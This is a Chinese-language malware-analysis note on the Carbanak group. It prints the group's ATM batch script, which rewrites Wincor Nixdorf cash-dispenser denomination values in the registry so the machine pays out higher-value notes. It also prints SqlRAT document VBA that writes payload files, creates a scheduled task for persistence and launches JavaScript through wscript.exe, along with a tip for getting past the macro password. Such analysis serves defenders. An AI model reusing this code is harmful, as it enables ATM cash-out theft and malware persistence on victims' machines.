# Carbanak

## 特征

1. 该组织在拥有ATM机的权限时会下载恶意脚本1.bat，下载完毕后会立即执行该脚本更改ATM机的注册表中的纸币面值，比如攻击者收到10张面额100卢布的钞票，但是实际上是5000面额的钞票.

```bash
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_1 /t REG_SZ
/d “5000” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_2 /t REG_SZ
/d “1000” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_3 /t REG_SZ
/d “500” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_4 /t REG_SZ
/d “100” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_1 /t REG_SZ
/d “100” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_4 /t REG_SZ
/d “5000” /f
shutdown -r -t 0 –f
```

该脚本会修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER的VALUE_1的值为100，并且修改VALUE_4的值为5000，然后重启计算机，待重启后，吐出1号的纸币的面额将会更改为5000而不是100。

2. 使用SqlRAT工具创建恶意文档时会包含图像诱使受害者双击图像以便启动VBA，其代码进行了加密，可以通过16进制编辑器打开并搜索密码位置将DPb标识替换为DPx标识即可绕过.在该VBA代码中会声明三个文件的名称用来写入保存稍后的Payload.

```vba
Private Sub StartUnlock()
      Dim ldoc As Document, shds As Shapes, shd As Shape
      Dim pfs As Paragraphs, pf As Paragraph
      Set ldoc = Application. ActiveDocument
      Set shds = ldoc.Shapes
      Set pfs = ldoc.Paragraphs
      fn1 = "init.dot"
      fn2 = "mspromo.dot"
      fn3 = "second.dot"
      fl = 0
      For Each pf In pfs
            rg = pf.Range .Text
            If   (Instr(1, rg, "[PROTECTED CONTENTS]")> 0) Then
                  fl = 1
            End If
      Next
      ltm = Timer
      While (Timer < (ltm + 1))
             DoEvents
      Wend
      lf (fl = 1) Then
          Addstr "Preparing to starting unlocking. . . ...... . OK"
      Else
          Addstr "Preparing to starting unlocking. . . ...... . Err"
          ErrUnlock
          Exit Sub
      End lf
```

然后声明三个变量为创建的三个空文件写入内容.

```VBA
sc1 = ""
sc2= ""
sc3 = ""
ltm = Timer
Errl = 0
For Each shd In shds
      If (shd.Name = "Sh000001") Then
          sc1 = shd.TextFrame .TextRange .Text
          Errl = Errl +1
      End If
      If (shd. Name = "Sh000002") Then
          sc2 = shd.TextFrame.TextRange.Text
          Errl = Errl +1
      End If
      If (shd. Name = "Sh000003") Then
          sc3 = shd.TextFrame .TextRange.Text
          Errl = Errl + 1
      End If
```

写入的文件会存储到%APPDATA%\Microsoft\Templates目录下，然后会创建计划任务来保持其持久性.

```VBA
Private Sub b14(lparam, rparam, Descr)
Set service =CreateObject ("Schedule.Service")
Call service.Connect
Dim rootFolder, lFld
//定义文件夹对象
Set rootFolder = service.GetFolder("\")
//获取已注册任务文件夹
Set nFolder = rootFolder
Dim taskDefinition
//定义任务所有的脚本对象
Set taskDefinition = service.NewTask(0)
Dim regInfo
//定义任务注册信息
Set regInfo = taskDefinition.RegistrationInfo
regInfo. Description = Descr
regInfo.Author = "system"
Dim settings
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
Dim triggers
//定义触发器
Set triggers = taskDefinition.triggers
Dim trigger
Set trigger = triggers.Create(2)
Dim startTime, endTime
//定义激活触发器的时间
Dim time
time = #1/2/2018 9:00:00 AM#
startTime = XmlTime (time)
time = #1/2/2026 9:10:00 AM#
endTime = XmlTime ( time)

trigger.StartBoundary = startTime
trigger.EndBoundary = endTime
trigger. DaysInterval = 1  //每天都运行该计划任务
trigger.ID = "DailyTriggerId"
trigger.Enabled = True
If (lparam = "init.dot") Then
trigger.RandomDelay = "PT2M"
Else
trigger.RandomDelay = "PT3M"
//设置任务重复次数
End lf
```

3. 通过Windows工具wscript.exe调用JavaScript启动恶意软件.

```vba
Dim Action
Set Action = taskDefinition.Actions.Create(0)
Action.Path = "wscript.exe"
Action.Arguments = "/b /e:jscript """ & rparam & "\" & lparam & """"
'Action . Type = 0
Call rootFolder.RegisterTaskDefinition(Descr, taskDefinition, 6, , , 3)
```
